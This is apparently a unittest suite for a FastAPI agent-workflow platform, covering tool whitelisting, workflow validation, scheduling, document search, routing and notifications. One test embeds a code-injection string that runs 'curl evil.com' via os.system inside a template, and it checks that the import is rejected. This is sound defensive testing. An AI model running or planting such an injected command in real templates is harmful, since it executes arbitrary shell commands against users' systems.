import json
import time
import unittest
from datetime import datetime, timezone, timedelta
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

from app.database import Base, get_db
from app.main import app
from app.models.agent import CustomAgent
from app.models.workflow import Workflow, WorkflowVersion, WorkflowRun
from app.models.schedule import WorkflowSchedule, ScheduleExecution
from app.models.document import Document, DocumentChunk
from app.models.notification import Notification
from app.models.template import Template
from app.models.task import Task, TaskStatus, ExecutionEvent
from app.services.agent_service import AgentService
from app.services.workflow_service import WorkflowService
from app.workflows.validator import WorkflowValidator
from app.workflows.compiler import WorkflowCompiler
from app.services.scheduler_service import SchedulerService, compute_next_cron_run
from app.services.document_service import DocumentService
from app.services.template_service import TemplateService
from app.services.notification_service import NotificationService
from app.schemas.workflow import (
    WorkflowCreate,
    WorkflowDefinition,
    WorkflowNode,
    WorkflowEdge,
)
from app.schemas.model_router import ModelRouteRequest
from app.llm.router import ModelRouter

# In-memory database for isolated, reproducible test runs
TEST_DB_URL = "sqlite:///:memory:"
test_engine = create_engine(
    TEST_DB_URL,
    connect_args={"check_same_thread": False},
    poolclass=StaticPool,
)
TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=test_engine)


def override_get_db():
    db = TestingSessionLocal()
    try:
        yield db
    finally:
        db.close()


class TestPhase4Suite(unittest.TestCase):
    def setUp(self):
        Base.metadata.create_all(bind=test_engine)
        app.dependency_overrides[get_db] = override_get_db
        self.client = TestClient(app)
        self.db = TestingSessionLocal()

    def tearDown(self):
        self.db.close()
        app.dependency_overrides.clear()
        Base.metadata.drop_all(bind=test_engine)

    # =========================================================================
    # MODULE 1: VISUAL AGENT BUILDER & SECURITY
    # =========================================================================
    def test_agent_creation_and_tool_validation(self):
        """Backend must validate permitted tools and reject unwhitelisted tools."""
        # 1. Valid agent
        payload = {
            "name": "Math Research Sentinel",
            "description": "Performs verifiable mathematical calculations",
            "role": "researcher",
            "permitted_tools": ["calculator", "doc_inspector"],
            "model_provider": "ollama",
            "model_name": "llama3",
            "temperature": 0.3,
            "max_steps": 10,
            "system_prompt": "Perform mathematical proofs and AST calculations.",
            "review_policy": "standard",
            "is_enabled": True,
        }
        res = self.client.post("/api/v1/agents", json=payload)
        self.assertEqual(res.status_code, 201)
        data = res.json()
        self.assertEqual(data["name"], "Math Research Sentinel")
        self.assertIn("calculator", data["permitted_tools"])

        # 2. Reject unwhitelisted tool
        invalid_payload = dict(payload)
        invalid_payload["name"] = "Malicious Agent"
        invalid_payload["permitted_tools"] = ["arbitrary_untrusted_shell_exploit"]
        res_invalid = self.client.post("/api/v1/agents", json=invalid_payload)
        self.assertEqual(res_invalid.status_code, 400)
        self.assertIn("does not exist", res_invalid.json()["detail"])

    def test_agent_deletion_dependency_check(self):
        """Cannot delete an agent if it is actively referenced in a workflow."""
        agent, _ = AgentService.create_agent(
            db=self.db,
            user_id="sandip_sah",
            workspace_id="default_workspace",
            name="Referenced Scout",
            system_prompt="Analyze documents.",
            permitted_tools=["doc_inspector"],
        )
        self.assertIsNotNone(agent)

        # Create workflow referencing this agent
        wf_payload = WorkflowCreate(
            name="Workflow Using Agent",
            definition=WorkflowDefinition(
                nodes=[
                    WorkflowNode(id="start", type="start", label="Start"),
                    WorkflowNode(id="n_agent", type="agent", label="Agent Step", config={"agent_id": agent.id}),
                    WorkflowNode(id="end", type="end", label="End"),
                ],
                edges=[
                    WorkflowEdge(id="e1", source="start", target="n_agent"),
                    WorkflowEdge(id="e2", source="n_agent", target="end"),
                ],
            ),
        )
        wf, _ = WorkflowService.create_workflow(self.db, "sandip_sah", "default_workspace", wf_payload)
        self.assertIsNotNone(wf)

        # Attempt deletion
        success, err = AgentService.delete_agent(self.db, agent.id, "sandip_sah")
        self.assertFalse(success)
        self.assertIn("Referenced in workflow", err)

    # =========================================================================
    # MODULE 2: VISUAL WORKFLOW DESIGNER & VALIDATION
    # =========================================================================
    def test_workflow_cycle_detection(self):
        """Uncontrolled cycles in workflows must be detected and rejected."""
        cyclic_def = WorkflowDefinition(
            nodes=[
                WorkflowNode(id="start", type="start", label="Start"),
                WorkflowNode(id="stepA", type="agent", label="Step A", config={"role": "researcher"}),
                WorkflowNode(id="stepB", type="agent", label="Step B", config={"role": "coder"}),
                WorkflowNode(id="end", type="end", label="End"),
            ],
            edges=[
                WorkflowEdge(id="e1", source="start", target="stepA"),
                WorkflowEdge(id="e2", source="stepA", target="stepB"),
                WorkflowEdge(id="e3", source="stepB", target="stepA"),  # Cycle A -> B -> A
                WorkflowEdge(id="e4", source="stepB", target="end"),
            ],
        )
        validation = WorkflowValidator.validate(cyclic_def)
        self.assertFalse(validation.is_valid)
        error_types = [e.error_type for e in validation.errors]
        self.assertIn("cycle", error_types)

    def test_workflow_orphan_node_detection(self):
        """Orphan / disconnected nodes unreachable from Start must be flagged."""
        orphan_def = WorkflowDefinition(
            nodes=[
                WorkflowNode(id="start", type="start", label="Start"),
                WorkflowNode(id="stepA", type="agent", label="Step A", config={"role": "researcher"}),
                WorkflowNode(id="lonely_step", type="agent", label="Unreachable Step", config={"role": "coder"}),
                WorkflowNode(id="end", type="end", label="End"),
            ],
            edges=[
                WorkflowEdge(id="e1", source="start", target="stepA"),
                WorkflowEdge(id="e2", source="stepA", target="end"),
            ],
        )
        validation = WorkflowValidator.validate(orphan_def)
        self.assertFalse(validation.is_valid)
        error_types = [e.error_type for e in validation.errors]
        self.assertIn("orphan", error_types)

    def test_workflow_versioning_on_update(self):
        """Updating workflow definition must automatically increment version snapshot."""
        init_payload = WorkflowCreate(
            name="Versioned Pipeline",
            definition=WorkflowDefinition(
                nodes=[
                    WorkflowNode(id="start", type="start", label="Start"),
                    WorkflowNode(id="end", type="end", label="End"),
                ],
                edges=[WorkflowEdge(id="e1", source="start", target="end")],
            ),
        )
        wf, _ = WorkflowService.create_workflow(self.db, "sandip_sah", "default_workspace", init_payload)
        self.assertEqual(wf.version, 1)

        # Update definition with an intermediate tool node
        update_res = self.client.put(
            f"/api/v1/workflows/{wf.id}",
            json={
                "definition": {
                    "nodes": [
                        {"id": "start", "type": "start", "label": "Start", "x": 0, "y": 0, "config": {}},
                        {"id": "calc", "type": "tool", "label": "Calculator", "x": 100, "y": 0, "config": {"tool_name": "calculator"}},
                        {"id": "end", "type": "end", "label": "End", "x": 200, "y": 0, "config": {}},
                    ],
                    "edges": [
                        {"id": "e1", "source": "start", "target": "calc"},
                        {"id": "e2", "source": "calc", "target": "end"},
                    ],
                    "variables": {},
                },
                "changelog": "Added safe calculator node",
            },
        )
        self.assertEqual(update_res.status_code, 200)
        self.assertEqual(update_res.json()["version"], 2)

    # =========================================================================
    # MODULE 3: REAL-TIME EXECUTION STREAMING
    # =========================================================================
    def test_streaming_sse_and_authorization(self):
        """SSE streaming endpoint must enforce mission ownership and format valid SSE."""
        task = Task(
            id="stream_task_1",
            user_id="sandip_sah",
            goal="Test real-time SSE streaming",
            status=TaskStatus.RUNNING,
        )
        event = ExecutionEvent(
            id="ev_001",
            task_id="stream_task_1",
            step_index=1,
            event_type="AGENT_STARTED",
            agent_name="researcher",
            message="Research Scout active",
            status="SUCCESS",
        )
        self.db.add_all([task, event])
        self.db.commit()

        # Authorized stream request
        res = self.client.get("/api/v1/tasks/stream_task_1/events/stream", headers={"x-user-id": "sandip_sah"})
        self.assertEqual(res.status_code, 200)
        self.assertIn("text/event-stream", res.headers["content-type"])

        # Unauthorized access from another user
        res_unauth = self.client.get("/api/v1/tasks/stream_task_1/events/stream", headers={"x-user-id": "intruder_user"})
        self.assertEqual(res_unauth.status_code, 403)

    # =========================================================================
    # MODULE 4: WORKFLOW SCHEDULER & IDEMPOTENCY
    # =========================================================================
    def test_scheduler_idempotency_and_timezone(self):
        """Scheduled execution must generate deterministic idempotency keys and prevent duplicates."""
        sched = WorkflowSchedule(
            user_id="sandip_sah",
            name="Daily Morning Report",
            goal="Synthesize daily system health audit",
            schedule_type="recurring",
            cron_expression="0 9 * * 1-5",  # 9am weekdays
            timezone_str="America/New_York",
            is_enabled=True,
            allow_overlap=False,
        )
        self.db.add(sched)
        self.db.commit()
        self.db.refresh(sched)

        # 1. Execute run
        exec1, err1 = SchedulerService.execute_scheduled_run(self.db, sched.id)
        self.assertIsNone(err1)
        self.assertIsNotNone(exec1)
        self.assertEqual(exec1.status, "SUCCESS")

        # 2. Duplicate execution within same slot must be neutralized by idempotency key
        exec2, err2 = SchedulerService.execute_scheduled_run(self.db, sched.id)
        self.assertIn("Idempotent replay", err2)
        self.assertEqual(exec1.id, exec2.id)

    def test_cron_next_run_calculation(self):
        """Cron evaluator correctly calculates future UTC run timestamp."""
        base_time = datetime(2026, 10, 23, 8, 30, tzinfo=timezone.utc)
        next_run = compute_next_cron_run("0 9 * * *", "UTC", from_dt=base_time)
        self.assertEqual(next_run.hour, 9)
        self.assertEqual(next_run.minute, 0)
        self.assertEqual(next_run.day, 23)

    # =========================================================================
    # MODULE 5: AGENT TEMPLATE LIBRARY & UNTRUSTED IMPORT
    # =========================================================================
    def test_template_import_rejection_of_untrusted_code(self):
        """Template import must strictly reject executable code injection."""
        malicious_json = json.dumps({
            "schema_version": "mesh.template.v1",
            "name": "Exploit Template",
            "slug": "exploit-temp",
            "template_type": "workflow",
            "category": "exploit",
            "version": "1.0.0",
            "description": "Malicious payload",
            "content": {
                "nodes": [],
                "edges": [],
                "injected_code": "__import__('os').system('curl evil.com')",
            },
        })
        res = self.client.post("/api/v1/templates/import", json={"template_json": malicious_json})
        self.assertEqual(res.status_code, 400)
        self.assertIn("Security violation", res.json()["detail"])

    def test_template_cloning_to_workspace(self):
        """Cloning a template must instantiate a real Agent or Workflow."""
        TemplateService.seed_builtin_templates(self.db)
        t = self.db.query(Template).filter(Template.slug == "research-report-agent").first()
        self.assertIsNotNone(t)

        clone_res = self.client.post(f"/api/v1/templates/{t.id}/clone?custom_name=My Custom Researcher")
        self.assertEqual(clone_res.status_code, 200)
        data = clone_res.json()
        self.assertTrue(data["success"])
        self.assertEqual(data["cloned_type"], "agent")

        # Verify agent exists in DB
        cloned_agent = self.db.query(CustomAgent).filter(CustomAgent.id == data["cloned_id"]).first()
        self.assertIsNotNone(cloned_agent)
        self.assertEqual(cloned_agent.name, "My Custom Researcher")

    # =========================================================================
    # MODULE 6: KNOWLEDGE BASE & RETRIEVAL CITATIONS
    # =========================================================================
    def test_document_validation_and_citation_search(self):
        """Documents must be validated and search must yield exact citations."""
        # 1. Text document upload
        doc_res = self.client.post(
            "/api/v1/documents/text",
            json={
                "filename": "infrastructure_policies.txt",
                "content": "Rule 101: All external database connections must enforce TLS 1.3 encryption. Internal VPC ports 8000 and 5173 are isolated.",
                "workspace_id": "default_workspace",
            },
        )
        self.assertEqual(doc_res.status_code, 201)
        doc_id = doc_res.json()["id"]

        # 2. Search knowledge base
        search_res = self.client.post(
            "/api/v1/documents/search",
            json={"query": "database TLS 1.3 encryption"},
        )
        self.assertEqual(search_res.status_code, 200)
        data = search_res.json()
        self.assertGreaterEqual(data["total_found"], 1)
        citation = data["citations"][0]
        self.assertEqual(citation["filename"], "infrastructure_policies.txt")
        self.assertIn("TLS 1.3", citation["matched_snippet"])
        self.assertIn("UNTRUSTED CITATION DATA ONLY", data["untrusted_context_block"])

    def test_document_magic_byte_verification(self):
        """Reject files with mismatched magic bytes."""
        # Fake PDF without %PDF- header
        fake_pdf = b"NOT_A_REAL_PDF_CONTENTS_JUST_MALICIOUS_DATA"
        valid, err, _ = DocumentService.validate_file("fake.pdf", fake_pdf)
        self.assertFalse(valid)
        self.assertIn("magic bytes", err.lower())

    # =========================================================================
    # MODULE 7: INTELLIGENT MODEL ROUTING
    # =========================================================================
    def test_model_router_privacy_and_budget_guards(self):
        """Router routes private documents to local zero-cost provider and blocks external exfiltration."""
        # When private documents are present, must select local zero-cost Ollama (or offline mock)
        route = ModelRouter.route(ModelRouteRequest(
            task_category="research",
            has_private_documents=True,
        ))
        self.assertTrue(route.is_local_zero_cost)
        self.assertIn(route.selected_provider, ("ollama", "mock"))
        self.assertIn("Privacy", route.reason)

    # =========================================================================
    # MODULE 9: NOTIFICATIONS
    # =========================================================================
    def test_notification_deduplication_and_read_status(self):
        """Notifications must support deduplication and read toggles."""
        n1 = NotificationService.create_notification(
            db=self.db,
            user_id="sandip_sah",
            notification_type="mission_completed",
            title="Mission Completed",
            message="Fibonacci solver finished",
            dedup_key="task_123_completed",
        )
        self.assertIsNotNone(n1)

        # Duplicate notification with same key must return existing without double-counting
        n2 = NotificationService.create_notification(
            db=self.db,
            user_id="sandip_sah",
            notification_type="mission_completed",
            title="Mission Completed Duplicate",
            message="Should not duplicate",
            dedup_key="task_123_completed",
        )
        self.assertEqual(n1.id, n2.id)

        # Mark read
        res = self.client.post(f"/api/v1/notifications/{n1.id}/read")
        self.assertEqual(res.status_code, 200)

    # =========================================================================
    # MODULE 10: SECURITY & READINESS PROBES
    # =========================================================================
    def test_readiness_and_liveness_probes(self):
        """Health /health and Readiness /ready endpoints must respond accurately."""
        # Health (Liveness)
        h_res = self.client.get("/health")
        self.assertEqual(h_res.status_code, 200)
        self.assertEqual(h_res.json()["status"], "healthy")

        # Ready (Readiness)
        r_res = self.client.get("/ready")
        self.assertEqual(r_res.status_code, 200)
        self.assertEqual(r_res.json()["status"], "ready")
        self.assertEqual(r_res.json()["database"], "connected")


if __name__ == "__main__":
    unittest.main()
